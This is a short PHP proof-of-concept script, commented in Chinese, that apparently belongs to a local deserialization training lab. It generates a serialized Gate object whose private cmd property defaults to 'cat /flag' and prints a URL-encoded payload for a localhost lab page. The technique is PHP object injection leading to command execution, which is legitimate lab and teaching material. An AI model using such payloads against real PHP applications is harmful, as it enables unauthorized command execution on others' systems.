<?php
/**
 * L3 payload 生成器
 *
 * L3 的坑在「传输」不在「构造」：
 *   private 属性的序列化名是 \0Gate\0cmd，其中 \0 是真正的 0x00 字节。
 *   在输入框里敲 \0 得到的是反斜杠 + 0 两个字符，unserialize 直接失败；
 *   页面显示时又会把真 NUL 替换成 \0，所以两者看起来一模一样。
 *
 * 交给 PHP 生成就没这个问题：它自己会吐真 NUL 字节。
 *
 * 运行（容器内）：
 *   docker exec deser-php php /poc/gen_l3.php
 *   docker exec deser-php php /poc/gen_l3.php "id"
 *
 * 输出：一行原始 payload（含 NUL）+ 一行 URL 编码版（可直接粘浏览器）
 */

// 只声明属性，不要写 __destruct —— 否则这个脚本自己会执行命令
class Gate
{
    private $cmd;
    public $token;

    public function __construct($cmd, $token)
    {
        $this->cmd   = $cmd;
        $this->token = $token;
    }
}

$cmd   = $argv[1] ?? 'cat /flag';
// token 的期望值来自 inc/classes.php 里的 Gate::TRUST
$token = $argv[2] ?? 'internal-node-v1';

$payload = serialize(new Gate($cmd, $token));

echo "原始: ", str_replace("\0", '\\0', $payload), PHP_EOL;
echo "URL : ", 'http://127.0.0.1:8890/l3.php?data=' . urlencode($payload), PHP_EOL;
